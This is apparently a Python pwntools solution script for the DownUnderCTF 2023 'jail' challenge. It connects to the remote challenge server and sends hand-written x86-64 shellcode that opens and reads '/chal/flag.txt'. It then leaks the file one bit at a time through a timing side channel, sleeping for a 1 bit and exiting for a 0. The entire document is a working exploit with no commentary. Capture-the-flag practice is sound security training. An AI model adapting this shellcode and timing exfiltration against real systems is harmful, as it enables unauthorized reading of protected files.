from pwn import *

context(arch='amd64', os='linux')

def get_eight_bytes(bytes_number):
    result = b''
    tmp = b''

    for i in range(64):
        # p = process('/mnt/c/Users/zahar/Downloads/jail')
        p = remote('2023.ductf.dev', 30010)
        p.recvuntil(b'> ')
    
        payload = asm('''
            xor    rdx, rdx
            xor    r10, r10
            mov    rdi, -100  
            mov    rax, 0x101             
            mov    rsi, 0x007478742e6761 
            push   rsi
            mov    rsi, 0x6c662f6c6168632f
            push   rsi
            push   rsp
            pop    rsi
            syscall
            mov    rdi, rax
            xor    rax, rax
            sub    rsp, 0x100
            lea    rsi, [rsp]
            mov    rdx, 0x100
            syscall
            add    rsi, ''' + str(bytes_number * 8) + '''
            mov    rdi, [rsi]
            mov    cl, '''  + str(i) + '''
            cmp    cl, 0
            je     shift_zero     
            shr    rdi, cl
        shift_zero:
            and    rdi, 1
            jz     zero
            mov    rax, 0x23
            xor    rdi, rdi
            push   rdi
            mov    rdi, 5
            push   rdi
            push   rsp
            pop    rdi
            syscall
        zero:
            mov    rax, 0x3c
            syscall
        '''
        )

        begin = time.time()
        p.sendline(payload)
        
        try:
            p.recv()
        except EOFError:
            end = time.time()
            if end - begin > 0.5:
                # print('1')
                tmp += b'1'
            else:
                # print('0')
                tmp += b'0'
            p.close()
        
        if len(tmp) == 8:
            result += tmp[::-1]
            tmp = b''
    
    return (int(result, base=2)).to_bytes(8, byteorder='little')[::-1]
        
    

for i in range(5, 10):
    print(get_eight_bytes(i))